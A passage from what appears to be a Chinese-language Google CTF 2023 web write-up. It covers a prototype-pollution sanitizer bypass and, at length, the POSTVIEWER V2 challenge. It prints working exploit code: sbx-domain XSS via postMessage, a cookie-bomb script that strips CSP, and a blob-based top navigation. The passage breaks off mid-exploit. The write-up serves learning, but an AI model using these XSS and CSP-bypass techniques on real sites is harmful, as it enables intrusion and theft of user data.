punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function-variable function">setInnerHTML</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">elem<span class="token punctuation">,</span> html</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  goog<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>safe<span class="token punctuation">.</span><span class="token function">setInnerHtml</span><span class="token punctuation">(</span>elem<span class="token punctuation">,</span> html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而這個 sanitizer 可以藉由 prototype pollution 繞過部分限制，你不能用新的 tag，但可以繞過 attribute 的限制，例如說 iframe 原本就允許使用，因此你想用 iframe srcdoc 是可以的</p><p>有個麻煩的地方是 CSP 是 <code>base-uri &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39; &#39;unsafe-eval&#39;; require-trusted-types-for &#39;script&#39;;</code>，裡面有 trusted types，所以雖然你可以插入 <code>&lt;img src=x onerror=alert(1)&gt;</code>，但是背後的 sanitizer 在執行 <code>img.setAttribute(&#39;onerror&#39;,&#39;alert(1)&#39;)</code> 時就會觸發 trusted types 的錯誤，就掛了。</p><p>當初搞了很久都繞不過去，後來有個想法是其實 static 資料夾底下有一堆測試用的 HTML 檔案，如果裡面哪個有 XSS 漏洞的話，其實用個 iframe src 就可以 flag 了，當時有稍微找一下不過沒找到，賽後看到有人確實是用這個解的，用的是這個檔案：<a href="https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html">https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html</a></p><p>再後來突然發現它載入 JS 是這樣：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/closure-library/closure/goog/base.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/bootstrap.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/sanitizer.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/main.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中有個叫做 editor 的變數是定義在 <code>bootstrap.js</code>，然後會在 <code>main.js</code> 裡面作為 script src 載入腳本，如果我們用 iframe csp 擋住 <code>bootstrap.js</code> 的載入，然後再搭配污染 Object.prototype.editor，就可以載入任意 JS。</p><p>而這也確實是 intended solution。</p><p>當初是在 <a href="https://github.com/aszx87410/ctf-writeups/issues/48">Intigriti’s November XSS challenge</a> 學到這招的，把 CSP 變嚴格來阻止某些 script 的載入。</p><h3><span id="veggie-soda-13-solves">VEGGIE SODA (13 solves)</span></h3><p>這題賽中的時候隊友一個人把它解開了，完全沒看。</p><p>賽後看了一下官方解法，第一關是用 HEAD 來繞過 CSRF 的保護，這個好像也是滿常用的技巧，第二關看起來跟去年的 <a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves">HORKOS</a> 有點像，就一樣是 JS 反序列化的漏洞，找到 gadget chain 就可以利用然後拿到 XSS。</p><p>貼一下官方解法連結：<a href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda">https://github.com/google/google-ctf/tree/master/2023/web-vegsoda</a></p><h3><span id="postviewer-v2-7-solves">POSTVIEWER V2 (7 solves)</span></h3><p>其實就是這題讓我一直逃避寫 writeup，很像電影全面啟動（inception），一層又一層，複雜到我到後面都不知道自己在幹嘛了。</p><p>雖然叫做 V2，但其實本質跟去年的題目差滿多的。</p><p>先來看重點，重點在這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這邊會新增一個 random 的 sbx domain 的 iframe，然後把 flag 透過 postMessage 傳過去，而這個 sbx domain 的內容也很簡單：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">TRUSTED_ORIGIN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Untrusted Origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">DEFAULT_STYLE</span> <span class="token operator">=</span> <span class="token string">'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;'</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> forbidden_sbx <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">allow-same-origin</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Wrong origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> <span class="token operator">!</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"No content to render"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>cssText <span class="token operator">=</span> <span class="token constant">DEFAULT_STYLE</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>        iframe<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> value <span class="token keyword">of</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>forbidden_sbx<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">supports</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Unsupported value: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>        window<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'blob loaded'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>會把收到的內容變成 blob，然後再弄一個 sandbox iframe 放進去，而我們的目標是偷到這個 iframe 裡面的內容。</p><p>而最麻煩的點還有幾個：</p><ol><li>admin bot 有限制，這題不能新開視窗，任何跟 <code>window.open</code> 類似的功能都不能用</li><li>主 domain 的 CSP 是：<code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com</code></li><li>sbx domain 的 CSP 是：<code>frame-src blob:</code></li></ol><p>首先呢，我們可以很輕鬆地拿到任何一個 sbx domain 的 XSS，像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> urliframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">body</span><span class="token operator">:</span><span class="token string">"&lt;script>alert(document.domain)&lt;/script>"</span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span><span class="token string">"allow-scripts"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>好，問題來了，接下來可以做什麼？</p><p>我們的第一步應該是要想辦法把主 domain 弄到 iframe 裡面去，才能做後續操作，但問題是 sbx domain 只允許嵌入 <code>blob:</code> 開頭的頁面，這怎麼辦呢？</p><p>此時我們想到了可以利用 cookie bomb，把 sbx domain 弄成 <code>HTTP/2 413 Request Entity Too Large</code>，這樣的錯誤頁面就沒有了 CSP。</p><p>所以流程是：</p><ol><li>先載入我們自己的網頁</li><li>嵌入一個 sbx iframe，拿到 XSS</li><li>從 sbx iframe 寫入 cookie，讓 &#x2F;bomb 路徑無法載入</li><li>再新增一個 iframe 是 &#x2F;bomb，這個頁面沒有 CSP</li><li>從第二步的 iframe 可以直接改寫第四步的 iframe 的內容，拿到一個沒有 CSP 的 XSS</li><li>接下來就可以在 iframe 裡面再嵌入 main domain</li></ol><p>一直到第五步都是對的，但第六步是錯的，雖然現在沒了 <code>frame-src blob:</code> 的限制，但是 main domain 的 <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com;</code> 是指所有的 parent page，所以只要我們的 top-level page 是自己的，就繞不過 CSP。</p><p>接著我突然想到可以利用 blob，像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>hello&lt;/h1>&lt;iframe src="http://127.0.0.1:5000/test">&lt;/iframe>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>url <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>location <span class="token operator">=</span> url<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣就可以讓 top-level domain 是 <code>sbx-xxx.postviewer2-web.2023.ctfcompetition.com</code>，符合了 CSP。</p><p>不過在嘗試的時候出現了錯誤：</p><blockquote><p>Unsafe attempt to initiate navigation for frame with origin ‘<a href="http://localhost:3000/">http://localhost:3000/</a>‘ from frame with URL ‘blob:<a href="https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818">https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818</a>‘. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.</p></blockquote><p>後來隊友發現 iframe 補上 sandbox 就可以了：<code>frame.sandbox = &#39;allow-modals allow-scripts allow-top-navigation allow-same-origin&#39;</code>，這也是滿值得紀錄的一個行為，我以為沒有 sandbox 的權限會更大，沒想到加上 sandbox 才可以？</p><p>所以這時候的流程就變成：</p><ol><li>先載入我們自己的網頁</li><li>嵌入一個 sbx iframe(f1)，拿到 XSS</li><li>從 frame1 寫入 cookie，讓 &#x2F;bomb 路徑無法載入</li><li>再新增一個 iframe 是 &#x2F;bomb(f2)，這個頁面沒有 CSP</li><li>再新增一個 iframe f3 來執行操作</li><li>從 f3 改寫 f2 的 HTML，寫入的 script 會新增一個 blob html 然後改變 top.location</li><li>成功載入 blob 並且沒有任何 CSP</li><li>在 blob 頁面載入 main domain iframe</li></ol><p>此時的 exploit 就已經 100 行了而且超複雜：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> bombFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    bombFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url    bombFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bombFrame created'</span><span class="token punctuation">)</span>      bombFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">          &lt;script>            const domain = document.domain            const cookieCount = 10            const cookieLength = 3000            const expireAfterMinute = 5            setCookieBomb()            function setCookie(key, value) &#123;              const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);              const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()              parent.document.cookie = v            &#125;            function setCookieBomb() &#123;              const value = 'Boring' + '_'.repeat(cookieLength)              for (let i=0; i&lt;cookieCount; i++) &#123;                setCookie('key' + i, value);              &#125;            &#125;          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>        <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>bombFrame<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> brokenFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> <span class="token string">'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb'</span>      brokenFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url      brokenFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame loaded'</span><span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>brokenFrame<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  